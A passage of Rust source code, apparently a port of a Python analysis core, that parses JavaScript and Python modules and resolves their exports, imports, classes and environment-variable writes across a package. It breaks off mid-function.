    fn js_body<'m, R: AsRef<[u32]>>(&self, masked: &'m [R], k: usize, at: usize) -> Vec<&'m [u32]> {
        let first = match pystr::find_char(masked[k].as_ref(), c('{'), at) {
            Some(f) => f,
            None => return Vec::new(),
        };
        let mut rows = Vec::new();
        let mut depth: isize = 0;
        let stop = masked.len().min(k + self.lim.window + 1);
        for (j, full) in masked.iter().enumerate().take(stop).skip(k) {
            let full: &'m [u32] = full.as_ref();
            let row: &'m [u32] = if j == k { pystr::from(full, first) } else { full };
            let mut cut = None;
            for b in self.rx.brace.finditer(row) {
                depth += if b.group0()[0] == c('{') { 1 } else { -1 };
                if depth == 0 {
                    cut = Some(b.end());
                    break;
                }
            }
            match cut {
                None => rows.push(row),
                Some(e) => {
                    rows.push(&row[..e]);
                    return rows;
                }
            }
        }
        rows
    }

    /// core._xf_js_ret
    fn js_ret(&self, refs: &[&[u32]], params: &[PyStr]) -> Ret {
        let mut returns: Vec<&[u32]> = Vec::new();
        let mut locals: Vec<(&[u32], &[u32])> = Vec::new();
        for row in refs {
            for m in self.rx.js_return.finditer(row) {
                returns.push(m.name("expr").unwrap_or(&[]));
            }
        }
        for row in refs {
            for m in self.rx.js_local.finditer(row) {
                locals.push((m.name("name").unwrap_or(&[]), m.name("rhs").unwrap_or(&[])));
            }
        }
        self.ret(&returns, &locals, refs, params)
    }

    /// core._xf_js_fn: (ret, params, body rows) of the function whose header
    /// starts at column `at` of row k.
    fn js_fn<'m, R: AsRef<[u32]>>(&self, masked: &'m [R], k: usize, at: usize) -> (Ret, Vec<PyStr>, Vec<&'m [u32]>) {
        let row: &'m [u32] = masked[k].as_ref();
        let params = self.params(row, at);
        let arrow = pystr::find(row, &[c('='), c('>')], at);
        let brace = pystr::find_char(row, c('{'), at);
        if let Some(arrow) = arrow.filter(|&a| brace.map_or(true, |b| a < b)) {
            let rest = pystr::lstrip(pystr::from(row, arrow + 2));
            if !pystr::starts_with(rest, "{") {
                let r = self.ret(&[rest], &[], &[rest], &params);
                return (r, params, vec![rest]);
            }
            let body = self.js_body(masked, k, arrow);
            return (self.js_ret(&body, &params), params, body);
        }
        let body = self.js_body(masked, k, at);
        (self.js_ret(&body, &params), params, body)
    }

    /// core._xf_js_views: (code rows, masked rows), comments blanked (and
    /// string contents in the masked rows); a long row is read as blank.
    /// (Rows are the text's own where nothing in them is blanked; `changed`:
    /// a code row is not, so the code is not the text.)
    fn js_views<'a>(&self, text: &'a [u32]) -> (Vec<Cow<'a, [u32]>>, Vec<Cow<'a, [u32]>>, bool) {
        let mut code = Vec::new();
        let mut masked = Vec::new();
        let mut in_block = false;
        let mut changed = false;
        for raw in pystr::split_char(text, c('\n')) {
            if raw.len() > self.lim.long_row {
                code.push(Cow::Borrowed(&[][..]));
                masked.push(Cow::Borrowed(&[][..]));
                changed = true;
                continue;
            }
            let mut m: Cow<[u32]> = if raw.iter().any(|&ch| ch == c('\'') || ch == c('"') || ch == c('`')) {
                Cow::Owned(self.js_mask_line(raw))
            } else {
                Cow::Borrowed(raw)
            };
            let mut row: Cow<[u32]> = Cow::Borrowed(raw);
            if !in_block && !m.contains(&c('/')) {
                code.push(row);
                masked.push(m);
                continue;
            }
            let mut spans: Vec<(usize, usize)> = Vec::new();
            let mut i = 0usize;
            let close = [c('*'), c('/')];
            let open = [c('/'), c('*')];
            while i <= m.len() {
                if in_block {
                    match pystr::find(&m, &close, i) {
                        None => {
                            spans.push((i, m.len()));
                            break;
                        }
                        Some(e) => {
                            spans.push((i, e + 2));
                            i = e + 2;
                            in_block = false;
                            continue;
                        }
                    }
                }
                let a = pystr::find(&m, &open, i);
                let lc = self.rx.js_line_comment.search_at(&m, i as isize, m.len() as isize).map(|x| x.start());
                if let Some(lc) = lc {
                    if a.map_or(true, |a| lc < a) {
                        spans.push((lc, m.len()));
                        break;
                    }
                }
                let a = match a {
                    None => break,
                    Some(a) => a,
                };
                match pystr::find(&m, &close, a + 2) {
                    None => {
                        spans.push((a, m.len()));
                        in_block = true;
                        break;
                    }
                    Some(e) => {
                        spans.push((a, e + 2));
                        i = e + 2;
                    }
                }
            }
            for (a, b) in spans {
                if a < b {
                    let mm = m.to_mut();
                    for x in a..b.min(mm.len()) {
                        mm[x] = c(' ');
                    }
                    let rr = row.to_mut();
                    for x in a..b.min(rr.len()) {
                        rr[x] = c(' ');
                    }
                    changed = true;
                }
            }
            code.push(row);
            masked.push(m);
        }
        (code, masked, changed)
    }

    /// core._xf_js_dirname_specs
    fn js_dirname_specs(&self, code: &[u32]) -> PyStr {
        self.rx.dirname.sub_fn(code, 0, |m| {
            let whole = m.group0();
            let rel: &[u32] = match m.name("a") {
                Some(a) => a,
                None => {
                    let bc = m.name("b").filter(|b| !b.is_empty()).or_else(|| m.name("c")).unwrap_or(&[]);
                    pystr::from(bc, 1)
                }
            };
            let mut rel = rel;
            while pystr::starts_with(rel, "./") {
                rel = &rel[2..];
            }
            let mut new = u("'./");
            new.extend_from_slice(pystr::lstrip_chars(rel, "/"));
            new.push(c('\''));
            if new.len() <= whole.len() {
                ljust(new, whole.len())
            } else {
                whole.to_vec()
            }
        })
    }

    /// core._xf_js_row_classes
    fn js_row_classes<R: AsRef<[u32]>>(&self, rows: &[R]) -> (Vec<Option<usize>>, Vec<isize>, Vec<PyStr>) {
        let mut row_class: Vec<Option<usize>> = vec![None; rows.len()];
        let mut names: Vec<PyStr> = Vec::new();
        let mut row_level: Vec<isize> = vec![0; rows.len()];
        let mut depth: isize = 0;
        let mut stack: Vec<(usize, isize)> = Vec::new();
        let mut pending: Option<PyStr> = None;
        for (k, row) in rows.iter().enumerate() {
            let row = row.as_ref();
            if let Some(&(name, at)) = stack.last() {
                row_class[k] = Some(name);
                row_level[k] = depth - at;
            }
            if !row.contains(&c('{')) && !row.contains(&c('}')) && !has(row, "class") {
                continue;
            }
            // (start, None: '{' / '}', Some(name): a class)
            let mut events: Vec<(usize, u32, Option<PyStr>)> = Vec::new();
            for m in self.rx.js_class.finditer(row) {
                events.push((m.start(), 0, Some(m.name("name").unwrap_or(&[]).to_vec())));
            }
            for m in self.rx.brace.finditer(row) {
                events.push((m.start(), m.group0()[0], None));
            }
            events.sort_by_key(|e| e.0);
            for (_pos, ch, name) in events {
                if let Some(name) = name {
                    pending = Some(name);
                } else if ch == c('{') {
                    if let Some(p) = pending.take() {
                        names.push(p);
                        stack.push((names.len() - 1, depth));
                    }
                    depth += 1;
                } else {
                    depth -= 1;
                    if stack.last().is_some_and(|s| s.1 == depth) {
                        stack.pop();
                    }
                }
            }
        }
        (row_class, row_level, names)
    }

    /// core._xf_js_object: the object literal whose '{' is at column `at` of
    /// row k, read as `cls` (its members static); the number of members.
    fn js_object<R: AsRef<[u32]>>(&self, module: &mut Module, rows: &[R], masked: &[R], k: usize, at: usize, cls: &[u32]) -> usize {
        let mut count = 0usize;
        let mut depth: isize = 0;
        let mut expect = false;
        let stop = masked.len().min(k + self.lim.object_rows);
        for j in k..stop {
            let row = masked[j].as_ref();
            let code_row = rows[j].as_ref();
            let mut i = if j == k { at } else { 0 };
            let n = row.len();
            while i < n {
                let ch = row[i];
                if expect && depth == 1 && ch != c(' ') && ch != c('\t') {
                    expect = false;
                    if let Some(m) = self.rx.js_member.match_at(code_row, i as isize, code_row.len() as isize) {
                        let name = m.name("name").unwrap_or(&[]).to_vec();
                        let ret = if m.name("method").is_some() {
                            let (ret, params, body) = self.js_fn(masked, j, m.name_span("name").map_or(i, |s| s.0));
                            self.body(module, dot(cls, &name), &params, &body);
                            ret
                        } else if m.name("colon").is_some() {
                            let value = pystr::from(row, m.end());
                            if self.rx.js_fn_value.match_(pystr::lstrip(value)).is_some() {
                                let (ret, params, body) = self.js_fn(masked, j, m.end());
                                self.body(module, dot(cls, &name), &params, &body);
                                ret
                            } else {
                                let expr = pystr::split_char(value, c(','))[0];
                                self.plain(expr)
                            }
                        } else {
                            let mut refs = BTreeSet::new();
                            refs.insert(name.clone()); // { pull }: the name it holds
                            Ret { source: false, refs }
                        };
                        Self::member(module, cls, &name, ret, true);
                        count += 1;
                    }
                }
                if ch == c('{') || ch == c('(') || ch == c('[') {
                    depth += 1;
                    if depth == 1 {
                        expect = true;
                    }
                } else if ch == c('}') || ch == c(')') || ch == c(']') {
                    depth -= 1;
                    if depth <= 0 {
                        return count;
                    }
                } else if ch == c(',') && depth == 1 {
                    expect = true;
                }
                i += 1;
            }
        }
        count
    }

    /// core._xf_js_parse
    fn js_parse(&self, module: &mut Module, rel: &[u32]) {
        if module.text.len() > self.lim.max_chars {
            return;
        }
        let (rows, masked, changed) = self.js_views(module.text);
        let mut code: Cow<[u32]> = if changed {
            let row_refs: Vec<&[u32]> = rows.iter().map(|r| r.as_ref()).collect();
            Cow::Owned(join_rows(&row_refs))
        } else {
            Cow::Borrowed(module.text) // (every row the text's own: "\n".join(rows) is the text)
        };
        if has(&code, "__dirname") {
            code = Cow::Owned(self.js_dirname_specs(&code));
        }
        let code: &[u32] = &code;
        let (row_class, row_level, class_names) = self.js_row_classes(&masked);
        let mut objects: HashMap<usize, PyStr> = HashMap::new();
        for (k, row) in masked.iter().enumerate() {
            if !row.contains(&c('{')) || row_class[k].is_some() || !self.object_words.iter().any(|w| pystr::find(row, w, 0).is_some()) {
                continue;
            }
            for m in self.rx.js_object.finditer(row) {
                let name = m.name("name");
                let cls: PyStr = match name {
                    Some(n) => n.to_vec(),
                    None if has(m.group0(), "module") => u("<exports>"),
                    None => u("<default>"),
                };
                if self.js_object(module, &rows, &masked, k, m.end() - 1, &cls) > 0 {
                    if let Some(n) = name {
                        objects.insert(k, n.to_vec());
                    }
                }
            }
        }
        for (k, row) in masked.iter().enumerate() {
            let cls = row_class[k].map(|i| &class_names[i]);
            if has(row, "function") {
                for m in self.rx.js_func.finditer(row) {
                    let name = m.name("name").unwrap_or(&[]).to_vec();
                    if !module.defs.contains(&name) {
                        let (ret, params, body) = self.js_fn(&masked, k, m.start());
                        module.defs.insert(name.clone(), ret);
                        self.body(module, name, &params, &body);
                    }
                }
            }
            if let Some(cl) = cls {
                if row.contains(&c('{')) && row.contains(&c(')')) {
                    for m in self.rx.js_method.finditer(row) {
                        let name = m.name("name").unwrap_or(&[]);
                        if Self::in_set(self.js_keywords, name) {
                            continue;
                        }
                        let at = m.name_span("name").map_or(m.start(), |s| s.0);
                        let (ret, params, body) = self.js_fn(&masked, k, at);
                        Self::member(module, cl, name, ret, m.name("static").is_some());
                        self.body(module, dot(cl, name), &params, &body);
                    }
                }
                if row_level[k] == 1 && row.contains(&c('=')) {
                    if let Some(f) = self.rx.js_field.match_(row) {
                        let name = f.name("name").unwrap_or(&[]);
                        let rhs = f.name("rhs").unwrap_or(&[]);
                        if !Self::in_set(self.js_keywords, name) && rhs.len() <= self.lim.long_row {
                            let ret = if self.rx.js_fn_value.match_(pystr::lstrip(rhs)).is_some() {
                                let at = f.name_span("rhs").map_or(0, |s| s.0);
                                let (ret, params, body) = self.js_fn(&masked, k, at);
                                self.body(module, dot(cl, name), &params, &body);
                                ret
                            } else {
                                self.plain(rhs)
                            };
                            Self::member(module, cl, name, ret, f.name("static").is_some());
                        }
                    }
                }
                continue;
            }
            if has(row, "class") {
                if let Some(cm) = self.rx.js_class.search(row) {
                    module.classes.setdefault(cm.name("name").unwrap_or(&[]).to_vec(), OMap::default());
                }
            }
            let m = if row.contains(&c('=')) && (has(row, "const") || has(row, "let") || has(row, "var")) {
                self.rx.js_const.search(row)
            } else {
                None
            };
            if let Some(m) = m {
                let name = m.name("name").unwrap_or(&[]);
                let rhs = m.name("rhs").unwrap_or(&[]);
                if rhs.len() <= self.lim.long_row && objects.get(&k).map(|o| o.as_slice()) != Some(name) {
                    if self.rx.js_fn_value.match_(pystr::lstrip(rhs)).is_some() {
                        let at = m.name_span("rhs").map_or(0, |s| s.0);
                        let (ret, params, body) = self.js_fn(&masked, k, at);
                        module.defs.setdefault(name.to_vec(), ret);
                        self.body(module, name.to_vec(), &params, &body);
                    } else {
                        let ret = self.plain(rhs);
                        module.defs.setdefault(name.to_vec(), ret);
                    }
                }
            }
        }
        let line_of = |at: usize| pystr::count_char(code, c('\n'), 0, at);
        let col_of = |at: usize| at - pystr::rfind_char(code, c('\n'), 0, at).map_or(0, |p| p + 1);
        let esm = has(code, "export ") || has(code, "export\t") || has(code, "export{") || has(code, "export*");
        let default_word = has(code, "default");
        let from_word = has(code, "from");
        if esm {
            for m in self.rx.export_decl.finditer(code) {
                let name = m.name("name").unwrap_or(&[]).to_vec();
                module.exports.insert(name.clone(), Export::Local(name));
            }
        }
        if esm && default_word {
            for m in self.rx.export_default_decl.finditer(code) {
                let name = m.name("fn").filter(|s| !s.is_empty()).or_else(|| m.name("cls"));
                match name {
                    Some(n) if !n.is_empty() => module.default = Some(n.to_vec()),
                    _ => {
                        if has(m.group0(), "function") {
                            let k = line_of(m.start());
                            let (ret, params, body) = self.js_fn(&masked, k, col_of(m.start()));
                            module.defs.insert(u("<default>"), ret);
                            self.body(module, u("<default>"), &params, &body);
                            module.default = Some(u("<default>"));
                        }
                    }
                }
            }
            for m in self.rx.export_default.finditer(code) {
                module.default = Some(m.name("name").unwrap_or(&[]).to_vec());
            }
        }
        if module.classes.contains(&u("<default>")) && module.default.is_none() {
            module.default = Some(u("<default>")); // export default { … }
        }
        if esm {
            for m in self.rx.export_list.finditer(code) {
                for (local, exported) in js_destr(m.name("names").unwrap_or(&[])) {
                    module.exports.insert(exported, Export::Local(local));
                }
            }
        }
        if esm && from_word {
            for m in self.rx.export_from.finditer(code) {
                let key = js_key(rel, m.name("mod").unwrap_or(&[]));
                for (name, exported) in js_destr(m.name("names").unwrap_or(&[])) {
                    module.reexports.insert(exported, (key.clone(), Some(name)));
                }
            }
            for m in self.rx.export_star.finditer(code) {
                let key = js_key(rel, m.name("mod").unwrap_or(&[]));
                match m.name("ns").filter(|s| !s.is_empty()) {
                    Some(ns) => module.reexports.insert(ns.to_vec(), (key, None)),
                    None => {
                        if let Some(k) = key {
                            module.stars.push(k);
                        }
                    }
                }
            }
        }
        let exports_members: Vec<PyStr> = module.classes.get(&u("<exports>")).map(|m| m.keys.clone()).unwrap_or_default();
        for name in exports_members {
            let mut chain = u("<exports>.");
            chain.extend_from_slice(&name);
            module.exports.setdefault(name, Export::Ref(chain));
        }
        let cjs = has(code, "module");
        if cjs {
            for m in self.rx.modexp_obj.finditer(code) {
                for (exported, local) in js_destr(m.name("names").unwrap_or(&[])) {
                    module.exports.insert(exported, Export::Local(local));
                }
            }
        }
        if has(code, "exports") {
            for m in self.rx.modexp_prop.finditer(code) {
                let name = m.name("name").filter(|s| !s.is_empty()).or_else(|| m.name("qname")).unwrap_or(&[]).to_vec();
                let rhs = pystr::strip(pystr::rstrip_chars(pystr::strip(m.name("rhs").unwrap_or(&[])), ";"));
                if is(rhs, "void 0") || is(rhs, "undefined") {
                    continue;
                }
                if self.rx.dl_name.fullmatch(rhs).is_some() {
                    module.exports.insert(name, Export::Local(rhs.to_vec()));
                    continue;
                }
                let start = m.name_span("rhs").map_or(0, |s| s.0);
                let k = line_of(start);
                let at = col_of(start);
                let local = concat(&[&u("exports."), &name]);
                if self.rx.js_fn_value.match_(rhs).is_some() {
                    let (ret, params, body) = self.js_fn(&masked, k, at);
                    module.defs.insert(local.clone(), ret);
                    self.body(module, local.clone(), &params, &body);
                } else {
                    let expr: &[u32] = if k < masked.len() { pystr::from(&masked[k], at) } else { rhs };
                    let ret = self.plain(expr);
                    module.defs.insert(local.clone(), ret);
                }
                module.exports.insert(name, Export::Local(local));
            }
        }
        if cjs {
            for m in self.rx.modexp_all.finditer(code) {
                module.default = Some(m.name("name").unwrap_or(&[]).to_vec());
            }
            if has(code, "class") {
                for m in self.rx.modexp_class.finditer(code) {
                    module.default = Some(m.name("name").unwrap_or(&[]).to_vec());
                }
            }
            if has(code, "require(") {
                for m in self.rx.modexp_req.finditer(code) {
                    module.default_module = js_key(rel, m.name("mod").unwrap_or(&[]));
                }
            }
            for m in self.rx.modexp_fn.finditer(code) {
                let k = line_of(m.end());
                let (ret, params, body) = self.js_fn(&masked, k, col_of(m.end()));
                module.defs.insert(u("<default>"), ret);
                self.body(module, u("<default>"), &params, &body);
                module.default = Some(u("<default>"));
            }
        }
        if has(code, "defineProperty") {
            for m in self.rx.define.finditer(code) {
                let chain = self.nospace(m.name("ref").unwrap_or(&[]));
                module.exports.setdefault(m.name("name").unwrap_or(&[]).to_vec(), Export::Ref(chain));
            }
        }
        let req = has(code, "require(");
        let dynamic = has(code, "import(");
        let imp = has(code, "import") && from_word;
        fn name_import(module: &mut Module, local: PyStr, key: Option<PyStr>, exp: PyStr, kind: Kind, label: &[u32]) {
            module.imports.insert(local, Import { key, name: Some(exp), kind, label: Some(label.to_vec()) });
        }
        let mut destr: Vec<&Regex> = Vec::new();
        if req {
            destr.push(self.rx.req_destr);
        }
        if dynamic {
            destr.push(self.rx.dyn_destr);
        }
        for rx in destr {
            for m in rx.finditer(code) {
                let spec = m.name("mod").unwrap_or(&[]);
                let key = js_key(rel, spec);
                for (exp, local) in js_destr(m.name("names").unwrap_or(&[])) {
                    name_import(module, local, key.clone(), exp, Kind::Name, spec);
                }
            }
        }
        let mut ns: Vec<&Regex> = Vec::new();
        if req {
            ns.push(self.rx.req_ns);
        }
        if dynamic {
            ns.push(self.rx.dyn_ns);
        }
        for rx in ns {
            for m in rx.finditer(code) {
                let spec = m.name("mod").unwrap_or(&[]);
                module.imports.insert(
                    m.name("ns").unwrap_or(&[]).to_vec(),
                    Import { key: js_key(rel, spec), name: None, kind: Kind::Module, label: Some(spec.to_vec()) },
                );
            }
        }
        if req {
            for m in self.rx.req_member.finditer(code) {
                let spec = m.name("mod").unwrap_or(&[]);
                name_import(
                    module,
                    m.name("local").unwrap_or(&[]).to_vec(),
                    js_key(rel, spec),
                    m.name("name").unwrap_or(&[]).to_vec(),
                    Kind::Name,
                    spec,
                );
            }
        }
        if imp {
            for m in self.rx.imp_named.finditer(code) {
                let spec = m.name("mod").unwrap_or(&[]);
                let key = js_key(rel, spec);
                for (exp, local) in js_destr(m.name("names").unwrap_or(&[])) {
                    name_import(module, local, key.clone(), exp, Kind::Name, spec);
                }
            }
            for m in self.rx.imp_ns.finditer(code) {
                let spec = m.name("mod").unwrap_or(&[]);
                module.imports.insert(
                    m.name("ns").unwrap_or(&[]).to_vec(),
                    Import { key: js_key(rel, spec), name: None, kind: Kind::Module, label: Some(spec.to_vec()) },
                );
            }
            for m in self.rx.imp_default.finditer(code) {
                let spec = m.name("mod").unwrap_or(&[]);
                name_import(module, m.name("name").unwrap_or(&[]).to_vec(), js_key(rel, spec), u("default"), Kind::Default, spec);
            }
        }
        for (k, row) in rows.iter().enumerate() {
            if !has(row, "env") {
                continue;
            }
            for m in self.rx.js_env_write.finditer(row) {
                let var = m.name("a").filter(|s| !s.is_empty()).or_else(|| m.name("b")).unwrap_or(&[]).to_vec();
                let (a, b) = m.name_span("rhs").unwrap_or((0, 0));
                let rhs = pystr::sub(&masked[k], a, b);
                let old = module.env.get(&var).cloned().unwrap_or_default();
                let mut new = Ret { source: old.source || self.has_source(rhs), refs: old.refs };
                new.refs.extend(self.chains(rhs));
                module.env.insert(var, new);
            }
        }
        self.writes(module, &masked, &row_class, &class_names, Lang::Js);
    }
}

/// core._XfLocals: {name: (source, refs)} of assignments [(name, rhs)],
/// each read when _xf_follow reaches it.
struct Locals<'a> {
    rhs: HashMap<&'a [u32], Vec<&'a [u32]>>,
    done: HashMap<PyStr, Ret>,
}

impl<'a> Locals<'a> {
    fn new(pairs: &[(&'a [u32], &'a [u32])]) -> Locals<'a> {
        let mut rhs: HashMap<&'a [u32], Vec<&'a [u32]>> = HashMap::new();
        for (name, r) in pairs {
            rhs.entry(name).or_default().push(r);
        }
        Locals { rhs, done: HashMap::new() }
    }

    fn get(&mut self, xf: &Xf, name: &[u32]) -> Option<Ret> {
        let rhs = self.rhs.get(name)?;
        if let Some(r) = self.done.get(name) {
            return Some(r.clone());
        }
        let mut got = Ret::default();
        for r in rhs {
            got.source = got.source || xf.has_source(r);
            got.refs.extend(xf.chains(r));
        }
        self.done.insert(name.to_vec(), got.clone());
        Some(got)
    }
}

/// rx.finditer(text), for a MULTILINE pattern every match of which starts
/// where a line does, with spaces or tabs and then `word` (core's
/// `^[ \t]*from[ \t]+…`, `^[ \t]*import[ \t]+…`): only such lines are tried,
/// each at its start, from where the last match ended — the matches
/// finditer finds, in order. Any other pattern is searched as it is.
fn line_matches<'s>(rx: &'s Regex, text: &'s [u32], word: &str) -> Vec<crate::pyre::Match<'s>> {
    let mut head = u(r"^[ \t]*");
    head.extend(u(word));
    head.extend(u(r"[ \t]+"));
    if rx.flags & crate::pyre::MULTILINE == 0 || !rx.pattern.starts_with(&head) {
        return rx.finditer(text).collect();
    }
    let w = u(word);
    let mut out = Vec::new();
    let mut end = 0usize; // (where the last match ended: a search goes on from there)
    let mut line = 0usize;
    loop {
        if line >= end {
            let mut i = line;
            while i < text.len() && (text[i] == c(' ') || text[i] == c('\t')) {
                i += 1;
            }
            if text[i..].starts_with(&w) {
                if let Some(m) = rx.match_at(text, line as isize, text.len() as isize) {
                    end = m.end();
                    out.push(m);
                }
            }
        }
        match crate::scan::find1(text, line, text.len(), c('\n')) {
            Some(nl) => line = nl + 1,
            None => break,
        }
    }
    out
}

/// Where `(?:[^\\q]|\\.)*` matching row[from..] ends: at the first `q`
/// not escaped by a backslash, a backslash with nothing after it (or a
/// newline, which `.` does not take), or the row's end.
fn py_body_end(row: &[u32], from: usize, q: u32) -> usize {
    let n = row.len();
    let mut k = from;
    while k < n {
        let ch = row[k];
        if ch == c('\\') {
            if k + 1 < n && row[k + 1] != c('\n') {
                k += 2;
                continue;
            }
            break;
        }
        if ch == q {
            break;
        }
        k += 1;
    }
    k
}

/// core._xf_resolve
fn py_resolve(spec: &[u32], pkg_parts: &[&[u32]]) -> Option<PyStr> {
    let dots = spec.iter().take_while(|&&x| x == c('.')).count();
    let rest = &spec[dots..];
    if dots == 0 {
        return if rest.is_empty() { None } else { Some(rest.to_vec()) };
    }
    let keep = pkg_parts.len() as isize - (dots as isize - 1);
    if keep < 0 {
        return None;
    }
    let mut target: Vec<&[u32]> = pkg_parts[..keep as usize].to_vec();
    if !rest.is_empty() {
        target.extend(pystr::split_char(rest, c('.')));
    }
    let j = pystr::join(&[c('.')], &target);
    if j.is_empty() {
        None
    } else {
        Some(j)
    }
}

/// core._xf_js_destr: [(export/property name, local name)]
fn js_destr(names: &[u32]) -> Vec<(PyStr, PyStr)> {
    let mut out = Vec::new();
    for item in pystr::split_char(names, c(',')) {
        let item = pystr::replace_char(item, c(':'), c(' '));
        let item = pystr::replace(&item, &u(" as "), &u(" "));
        let parts: Vec<&[u32]> =
            pystr::split_ws(&item).into_iter().map(|p| pystr::strip_chars(p, "'\"`")).filter(|p| !p.is_empty()).collect();
        if parts.len() == 1 {
            out.push((parts[0].to_vec(), parts[0].to_vec()));
        } else if parts.len() >= 2 {
            out.push((parts[0].to_vec(), parts[1].to_vec()));
        }
    }
    out
}

/// posixpath.dirname
fn posix_dirname(p: &[u32]) -> &[u32] {
    let i = p.iter().rposition(|&x| x == c('/')).map_or(0, |k| k + 1);
    let head = &p[..i];
    if !head.is_empty() && !head.iter().all(|&x| x == c('/')) {
        pystr::rstrip_chars(head, "/")
    } else {
        head
    }
}

/// core._xf_js_norm
fn js_norm(rel: &[u32]) -> PyStr {
    let mut rel = rel;
    for ext in [".js", ".cjs", ".mjs", ".jsx", ".json"] {
        if pystr::ends_with(rel, ext) {
            rel = &rel[..rel.len() - ext.len()];
            break;
        }
    }
    if pystr::ends_with(rel, "/index") {
        rel[..rel.len() - 6].to_vec()
    } else {
        rel.to_vec()
    }
}

/// core._xf_js_key
fn js_key(rel: &[u32], spec: &[u32]) -> Option<PyStr> {
    if !pystr::starts_with(spec, ".") {
        return None;
    }
    let dir = posix_dirname(rel);
    // posixpath.join(dir, spec): spec starts with '.', not '/'
    let joined = if dir.is_empty() || dir.last() == Some(&c('/')) {
        concat(&[dir, spec])
    } else {
        concat(&[dir, &[c('/')], spec])
    };
    let key = js_norm(&pystr::normpath(&joined));
    Some(if is(&key, ".") { u("index") } else { key })
}

// ---------------- a package ----------------

/// core._XfPackage
struct Package<'t> {
    mods: OMap<Module<'t>>,
    /// resolve_export(key, name) from the top, by key and name
    exported: RefCell<HashMap<PyStr, HashMap<PyStr, Option<Res>>>>,
    /// names_of(key), sorted
    names: RefCell<HashMap<PyStr, Rc<Vec<PyStr>>>>,
    /// what _xf_seeds reads of a module's members: (name, export) for the
    /// first names, those that resolve to other than a module
    members: RefCell<HashMap<PyStr, Rc<Vec<(PyStr, Res)>>>>,
}

type Sym = (PyStr, PyStr);

impl<'t> Package<'t> {
    fn resolve_local(&self, xf: &Xf, m: &Module, name: &[u32], depth: usize) -> Option<Res> {
        if depth > xf.lim.max_depth {
            return None;
        }
        if m.defs.contains(name) {
            return Some(Res::Sym(m.key.clone(), name.to_vec()));
        }
        if m.classes.contains(name) {
            return Some(Res::Class(m.key.clone(), name.to_vec()));
        }
        let imp = m.imports.get(name)?;
        self.resolve_import(xf, imp, depth + 1)
    }

    fn resolve_import(&self, xf: &Xf, imp: &Import, depth: usize) -> Option<Res> {
        let key = imp.key.as_ref()?;
        if !self.mods.contains(key) {
            // a namespace package: from . import mod
            let name = imp.name.as_ref().filter(|n| imp.kind == Kind::Name && !n.is_empty())?;
            let sub = dot(key, name);
            return if self.mods.contains(&sub) { Some(Res::Module(sub)) } else { None };
        }
        if imp.kind == Kind::Module {
            return Some(Res::Module(key.clone()));
        }
        self.resolve_export(xf, key, imp.name.as_deref().unwrap_or(&[]), depth + 1)
    }

    /// resolve_export(key, name) from the top, remembered.
    fn export(&self, xf: &Xf, key: &[u32], name: &[u32]) -> Option<Res> {
        if let Some(r) = self.exported.borrow().get(key).and_then(|m| m.get(name)) {
            return r.clone();
        }
        let r = self.resolve_export(xf, key, name, 0);
        self.exported.borrow_mut().entry(key.to_vec()).or_default().insert(name.to_vec(), r.clone());
        r
    }

    /// sorted(names_of(key)), remembered
    fn sorted_names(&self, xf: &Xf, key: &[u32]) -> Rc<Vec<PyStr>> {
        if let Some(r) = self.names.borrow().get(key) {
            return r.clone();
        }
        let r = Rc::new(self.names_of(xf, key, 0).into_iter().collect::<Vec<_>>());
        self.names.borrow_mut().insert(key.to_vec(), r.clone());
        r
    }

    /// [(name, export(key, name))] for the first `max` sorted names whose
    /// export resolves to other than a module, remembered
    fn module_members(&self, xf: &Xf, key: &[u32], max: usize) -> Rc<Vec<(PyStr, Res)>> {
        if let Some(r) = self.members.borrow().get(key) {
            return r.clone();
        }
        let mut out = Vec::new();
        for name in self.sorted_names(xf, key).iter().take(max) {
            if let Some(sub) = self.export(xf, key, name) {
                if !matches!(sub, Res::Module(_)) {
                    out.push((name.clone(), sub));
                }
            }
        }
        let r = Rc::new(out);
        self.members.borrow_mut().insert(key.to_vec(), r.clone());
        r
    }

    fn resolve_export(&self, xf: &Xf, key: &[u32], name: &[u32], depth: usize) -> Option<Res> {
        let m = self.mods.get(key)?;
        if depth > xf.lim.max_depth {
            return None;
        }
        if m.lang == Lang::Py {
            if let Some(got) = self.resolve_local(xf, m, name, depth + 1) {
                return Some(got);
            }
            let sub = dot(key, name);
            return if self.mods.contains(&sub) { Some(Res::Module(sub)) } else { None };
        }
        if is(name, "default") {
            if let Some(d) = &m.default {
                return self.resolve_local(xf, m, d, depth + 1);
            }
            if let Some(dm) = &m.default_module {
                return if self.mods.contains(dm) { Some(Res::Module(dm.clone())) } else { None };
            }
            // else exports.default = … (TypeScript's and Babel's output), read below
        }
        match m.exports.get(name) {
            Some(Export::Ref(chain)) => return self.resolve_chain(xf, m, chain, None, depth + 1),
            Some(Export::Local(local)) => return self.resolve_local(xf, m, local, depth + 1),
            None => {}
        }
        if let Some((rkey, rname)) = m.reexports.get(name) {
            let rkey = rkey.as_ref()?;
            return match rname {
                None => Some(Res::Module(rkey.clone())),
                Some(n) => self.resolve_export(xf, rkey, n, depth + 1),
            };
        }
        let mut stars: Vec<&PyStr> = m.stars.iter().collect();
        if let Some(dm) = m.default_module.as_ref().filter(|d| !d.is_empty()) {
            stars.push(dm);
        }
        for star in stars {
            if let Some(got) = self.resolve_export(xf, star, name, depth + 1) {
                return Some(got);
            }
        }
        if let Some(d) = &m.default {
            if !is(name, "default") {
                // module.exports = api: api's members
                return self.resolve_chain(xf, m, &dot(d, name), None, depth + 1);
            }
        }
        None
    }

    fn resolve_chain(&self, xf: &Xf, m: &Module, chain: &[u32], cls: Option<&[u32]>, depth: usize) -> Option<Res> {
        let parts = pystr::split_char(chain, c('.'));
        if let Some(cls) = cls {
            if parts.len() >= 2 && (is(parts[0], "self") || is(parts[0], "this") || is(parts[0], "cls")) {
                let found = m.classes.get(cls).is_some_and(|meths| meths.contains(parts[1]));
                return if found { Some(Res::Sym(m.key.clone(), dot(cls, parts[1]))) } else { None };
            }
        }
        let mut got: Option<Res> = None;
        let mut used = 0usize;
        for i in (1..=parts.len()).rev() {
            let head = pystr::join(&[c('.')], &parts[..i]);
            if m.imports.contains(&head) || (i == 1 && (m.defs.contains(&head) || m.classes.contains(&head))) {
                got = self.resolve_local(xf, m, &head, depth + 1);
                used = i;
                break;
            }
        }
        let mut rest = &parts[used..];
        while !rest.is_empty() {
            let g = match &got {
                None => break,
                Some(g) => g.clone(),
            };
            got = match g {
                Res::Module(val) => self.resolve_export(xf, &val, rest[0], depth + 1),
                Res::Class(k, cl) => {
                    let found =
                        self.mods.get(&k).and_then(|mm| mm.classes.get(&cl)).is_some_and(|meths| meths.contains(rest[0]));
                    if found {
